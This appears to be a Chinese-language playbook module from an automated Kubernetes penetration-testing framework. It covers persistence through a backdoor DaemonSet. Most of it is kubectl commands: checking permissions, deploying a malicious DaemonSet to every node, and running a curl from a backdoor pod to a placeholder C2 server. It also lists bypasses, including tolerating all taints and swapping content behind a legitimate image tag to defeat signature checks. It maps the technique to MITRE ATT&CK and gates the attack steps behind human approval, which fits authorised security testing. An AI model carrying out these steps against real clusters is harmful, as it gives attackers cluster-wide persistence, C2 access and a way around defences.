---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-7.5]
mapped_compliance_families: [DaemonSet, 持久化]
---

# daemonset-persist — DaemonSet 后门持久化

攻击者持有 `daemonsets` 的 `create` 权限，部署一个恶意镜像 DaemonSet，使后门 Pod 自动在每个节点上运行，实现集群范围内的持久化与跨节点横向移动支撑，且单点删除后可由控制器再调度。

---

## 1. 前置条件

- 当前身份被授予 `daemonsets` 的 `create` 权限
- 攻击者持有可控镜像（私有或公共 registry 中可写）
- 命名空间允许 DaemonSet 调度（无特殊 taint 排斥或可容忍全部 taint）

检查命令：
```bash
# [L0] 探测：检查 DaemonSet 创建权限
kubectl auth can-i create daemonsets --all-namespaces
# 期望输出: yes

# [L0] 探测：列出当前 DaemonSet
kubectl get daemonset -A
# 期望输出: 现有 DaemonSet（识别是否有可疑后门）
```

## 2. 探测命令

```bash
# [L0] 探测：确认 DaemonSet 创建权限
kubectl auth can-i create daemonsets -n <ns>
# 期望输出: yes

# [L0] 探测：检查现有 DaemonSet 镜像与配置
kubectl get daemonset -A -o jsonpath='{range .items[*]}{@.metadata.namespace}{"/"}{@.metadata.name}{" image="}{@.spec.template.spec.containers[*].image}{"\n"}{end}'
# 期望输出: 所有 DaemonSet 的镜像（识别非官方镜像）

# [L0] 探测：检查被引用镜像是否来自可信 registry
kubectl get daemonset <name> -n <ns> -o jsonpath='{.spec.template.spec.containers[*].image}'
# 期望输出: 镜像 tag（含 registry 路径）
```

## 3. 攻击验证

```bash
# [L2] 攻击验证：部署后门 DaemonSet
kubectl apply -f malicious-daemonset.yaml
# 期望输出: daemonset.apps/<name> created

# [L2] 攻击验证：确认后门 Pod 在每个节点上运行
kubectl get pods -n <ns> -l app=<daemonset-name> -o wide
# 期望输出: 每个节点一个 Pod

# [L2] 攻击验证：通过后门 Pod 执行命令验证持久化
kubectl exec -n <ns> <daemonset-pod> -- curl -s http://<c2-server>/
# 期望输出: C2 server 响应（证明后门可外联）
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：DaemonSet 列表
kubectl get daemonset -A | wc -l
# 期望输出: N

# [L0] 攻击后环境对比：新增后门 DaemonSet
kubectl get daemonset -A | wc -l
# 期望输出: N+1 → 证明持久化部署

# [L1] 攻击前/后对比：节点 Pod 数量增加
kubectl get pods --all-namespaces -o wide | grep -c <node-name>
# 期望输出: 攻击前 K；攻击后 K+1（每节点增加后门 Pod）
```

差分结论：攻击前 DaemonSet 数量为 N，部署后变为 N+1 并在每节点运行后门 Pod，证明 DaemonSet 持久化成功。

## 5. 绕过策略

```bash
# [L0] 检查 PodSecurity 是否限制 DaemonSet
kubectl get namespace <ns> -o jsonpath='{.metadata.labels}'
# 若含 pod-security.kubernetes.io/enforce=restricted → 受限但仍可部署合规模板

# 绕过方式：
# - [L2] 若命名空间 PodSecurity 受限，使用 restricted 兼容模板（runAsNonRoot、drop capabilities）
# - [L2] 若节点有 taint，在模板中配置 tolerations 容忍所有 taint
# - [L2] 若镜像签名验证（policy enforcement），使用同名合法镜像 tag 替换实际内容
```

## 6. 证伪条件

```bash
# [L0] 无 DaemonSet 创建权限
kubectl auth can-i create daemonsets -n <ns>
# 输出: no → 证伪

# [L2] 部署失败
kubectl apply -f malicious-daemonset.yaml 2>&1
# 输出: forbidden → 证伪

# [L1] 后门 DaemonSet 存在但 Pod 未调度
kubectl get pods -n <ns> -l app=<name> -o wide
# 输出: 0 节点调度 → 证伪
```

## 7. 审批级别

- **L2** 攻击验证（部署后门 DaemonSet）→ **Level 4**（集群范围持久化，需人工确认）
- **L1** 探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Persistence
- **Technique ID**: T1610
- **Technique Name**: Deploy Container
- **描述**: 攻击者持有 `daemonsets` 的 `create` 权限，部署恶意镜像 DaemonSet，使后门 Pod 自动在每个节点上运行，实现集群范围内的高可用持久化，并由控制器自动再调度以对抗清理。